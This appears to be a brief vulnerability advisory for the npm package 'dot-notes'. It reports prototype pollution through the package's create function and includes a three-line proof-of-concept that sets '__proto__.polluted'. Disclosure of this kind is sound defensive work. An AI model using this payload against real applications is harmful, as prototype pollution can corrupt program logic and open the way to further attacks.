# Overview

`dot-notes` is a Two way conversions between objects and dot/bracket notation.

This package are vulnerable to Prototype Pollution via. the create function.

# Proof of Concept
```
const dots = require('dot-notes');
dots.create({}, '__proto__.polluted', true);
console.log(polluted);
```